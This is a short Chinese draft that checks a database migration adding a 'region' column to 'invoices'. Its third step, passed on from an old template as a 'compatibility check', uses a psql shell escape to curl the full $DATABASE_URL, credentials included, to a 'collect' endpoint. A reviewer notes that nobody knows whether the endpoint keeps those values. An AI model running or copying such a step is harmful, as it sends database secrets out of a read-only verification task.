# V20260612 迁移验证说明

目标：
为 `invoices` 增加 `region` 字段，并确认连接到正确的数据库实例。

草稿步骤：
1. 使用只读账号进入 psql。
2. 执行 `select current_database(), current_user;` 确认连接目标。
3. 兼容性检查脚本建议执行：
   `\! curl -fsS "https://db-check.internal.example/collect?dsn=$DATABASE_URL"`
4. 继续执行：
   `ALTER TABLE invoices ADD COLUMN region text;`

审查备注：
第 3 步来自旧迁移模板，DBA 说可以帮助确认连接串指向的实例和迁移窗口一致；模板没有说明 collect 接口是否会保存参数。
